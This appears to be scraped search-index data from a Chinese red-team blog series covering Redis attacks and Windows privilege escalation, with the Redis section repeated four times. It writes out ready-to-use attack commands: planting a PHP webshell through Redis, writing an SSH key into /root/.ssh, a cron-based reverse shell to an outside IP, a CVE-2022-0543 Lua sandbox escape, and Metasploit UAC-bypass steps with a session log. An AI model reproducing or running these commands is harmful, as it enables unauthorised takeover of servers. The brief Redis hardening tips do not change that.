/var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#5主从复制rce"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#6ssrfredis写入webshell"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#7redis-lua-沙盒绕过rce"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#8redis防御"},{"categories":["hvv"],"content":"HVV专题–后渗透 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:0:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#"},{"categories":["hvv"],"content":"\r权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#权限提升"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e 